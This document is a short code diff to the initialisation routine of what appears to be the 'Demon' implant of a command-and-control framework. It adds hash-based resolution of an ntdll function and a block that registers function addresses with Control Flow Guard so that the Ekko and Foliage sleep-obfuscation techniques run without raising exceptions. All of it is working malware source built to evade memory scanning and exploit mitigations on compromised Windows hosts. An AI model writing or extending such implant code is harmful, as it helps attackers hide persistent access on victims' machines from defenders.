@@ -302,6 +302,7 @@ VOID DemonInit( VOID )
         Instance.Win32.NtCreateEvent                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATEEVENT );
         Instance.Win32.NtSetEvent                        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETEVENT );
         Instance.Win32.NtSetInformationThread            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETINFORMATIONTHREAD );
+        Instance.Win32.NtSetInformationVirtualMemory     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETINFORMATIONVIRTUALMEMORY );
     } else {
         PUTS( "Failed to load ntdll from PEB" )
         return;
@@ -836,6 +837,30 @@ VOID DemonInit( VOID )
 
     /* Global Objects */
     Instance.Dotnet = NULL;
+
+    /* if cfg is enforced (and if sleep obf is enabled)
+     * add every address we're going to use to the Cfg address list
+     * to not raise an exception while performing sleep obfuscation */
+    if ( CfgQueryEnforced() )
+    {
+        PUTS( "Adding required function module &addresses to the cfg list"  );
+
+        /* common functions */
+        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtContinue );
+        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtSetContextThread );
+        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtGetContextThread );
+
+        /* ekko sleep obf */
+        CfgAddressAdd( Instance.Modules.Kernel32, Instance.Win32.WaitForSingleObjectEx );
+        CfgAddressAdd( Instance.Modules.Kernel32, Instance.Win32.VirtualProtect );
+        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Win32.NtSetEvent );
+
+        /* foliage sleep obf */
+        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtTestAlert );
+        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtWaitForSingleObject );
+        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtProtectVirtualMemory );
+        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Win32.RtlExitUserThread );
+    }
 
     PRINTF( "Instance DemonID => %x\n", Instance.Session.AgentID )
 }
